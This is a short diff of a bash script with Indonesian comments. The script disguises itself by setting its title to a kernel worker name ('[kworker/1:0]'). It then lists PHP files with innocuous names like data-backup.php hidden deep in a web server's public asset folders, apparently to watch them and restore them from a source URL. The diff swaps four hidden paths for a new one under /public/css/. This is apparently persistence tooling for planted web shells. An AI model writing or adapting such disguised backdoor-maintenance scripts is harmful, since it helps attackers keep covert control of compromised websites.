@@ -15,10 +15,7 @@ echo -ne "\033]0;[kworker/1:0]\007"
 
 # Daftar file yang dipantau
 FILES=(
-    "/var/www/html/public/video/data-backup.php"
-    "/var/www/html/public/dokumen/berkas/data-data.php"
-    "/var/www/html/public/assets/e-learning/scss/bootstrap/scss/forms/data-backup.php"
-    "/var/www/html/public/assets/berry/css/plugins/themes/data-data.php"
+    "/var/www/html/public/css/data-backup.php"
 )
 
 # URL file sumber
